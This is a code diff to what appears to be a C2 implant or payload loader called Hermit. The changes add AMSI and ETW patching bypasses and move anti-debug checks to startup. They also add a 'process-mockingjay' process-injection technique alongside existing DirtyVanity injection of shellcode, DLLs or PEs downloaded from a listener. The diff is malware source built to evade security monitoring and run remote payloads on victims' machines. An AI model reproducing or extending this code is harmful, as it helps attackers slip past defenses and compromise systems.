@@ -59,6 +59,16 @@ namespace Hermit
         }
         pModules->hAdvapi32 = hAdvapi32;
 
+        WCHAR wAmsi[] = L"amsi.dll";
+        HMODULE hAmsi = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wAmsi);
+        if (!hAmsi)
+        {
+			FreeLibrary(hNtdll);
+			FreeLibrary(hKernel32);
+            return nullptr;
+        }
+        pModules->hAmsi = hAmsi;
+
         WCHAR wBcrypt[] = L"bcrypt.dll";
         HMODULE hBcrypt = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wBcrypt);
         if (!hBcrypt)
@@ -78,6 +88,16 @@ namespace Hermit
             return nullptr;
         }
         pModules->hCrypt32 = hCrypt32;
+
+        WCHAR wDbghelp[] = L"dbghelp.dll";
+        HMODULE hDbghelp = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wDbghelp);
+        if (!hDbghelp)
+        {
+			FreeLibrary(hNtdll);
+			FreeLibrary(hKernel32);
+            return nullptr;
+        }
+        pModules->hDbghelp = hDbghelp;
 
         WCHAR wUser32[] = L"user32.dll";
         HMODULE hUser32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wUser32);
@@ -113,8 +133,10 @@ namespace Hermit
         Procs::FindProcsMisc(
             pProcs,
             hAdvapi32,
+            hAmsi,
             hBcrypt,
             hCrypt32,
+            hDbghelp,
             hUser32,
             hWinHttp,
             hWs2_32
@@ -128,6 +150,7 @@ namespace Hermit
         pState->pProcs                      = pProcs;
 		pState->pCrypt				        = Crypt::InitCrypt(pProcs, AES_KEY_BASE64_W, AES_IV_BASE64_W);
 		pState->lpPayloadType 		        = PAYLOAD_TYPE_W;
+        pState->lpPayloadToLoad             = PAYLOAD_TO_LOAD_W;
 		pState->lpPayloadTechnique 		    = PAYLOAD_TECHNIQUE_W;
         pState->lpPayloadProcessToInject    = PAYLOAD_PROCESS_TO_INJECT_W;
 		pState->lpListenerProto 	        = LISTENER_PROTOCOL_W;
@@ -138,6 +161,21 @@ namespace Hermit
 		pState->hConnect 			        = nullptr;
 		pState->hRequest 			        = nullptr;
 		// pState->pSocket 			        = nullptr;
+
+        // --------------------------------------------------------------------------
+        // Anti-Debug
+        // --------------------------------------------------------------------------
+
+        #ifdef PAYLOAD_ANTI_DEBUG
+        Technique::AntiDebug::StopIfDebug(pState->pProcs);
+        #endif
+
+        // --------------------------------------------------------------------------
+        // AMSI & ETW Bypass
+        // --------------------------------------------------------------------------
+
+        Technique::AmsiBypass::PatchAmsi(pState->pProcs);
+        Technique::EtwBypass::PatchEtw(pState->pProcs);
 
         // --------------------------------------------------------------------------
         // Initialize WinHttp handlers
@@ -199,11 +237,6 @@ namespace Hermit
             return;
         }
 
-        // Anti-Debug
-        #ifdef PAYLOAD_ANTI_DEBUG
-        Technique::AntiDebug::StopIfDebug(pState->pProcs);
-        #endif
-
         // Download DLL
         std::vector<BYTE> bytes = Download(pState);
         if (bytes.empty())
@@ -240,11 +273,6 @@ namespace Hermit
             return;
         }
 
-        // Anti-Debug
-        #ifdef PAYLOAD_ANTI_DEBUG
-        Technique::AntiDebug::StopIfDebug(pState->pProcs);
-        #endif
-
         // Download PE
         std::vector<BYTE> bytes = Download(pState);
         if (bytes.empty())
@@ -278,11 +306,6 @@ namespace Hermit
         {
             return;
         }
-
-        // Anti-Debug
-        #ifdef PAYLOAD_ANTI_DEBUG
-        Technique::AntiDebug::StopIfDebug(pState->pProcs);
-        #endif
 
         // Download shellcode
         std::vector<BYTE> bytes = Download(pState);
@@ -393,6 +416,13 @@ namespace Hermit
             Technique::Injection::DirtyVanity(
                 pState->pProcs,
                 dwTargetPID,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"process-mockingjay") == 0)
+        {
+            Technique::Injection::ProcessMockingjay(
+                pState->pProcs,
                 bytes
             );
         }
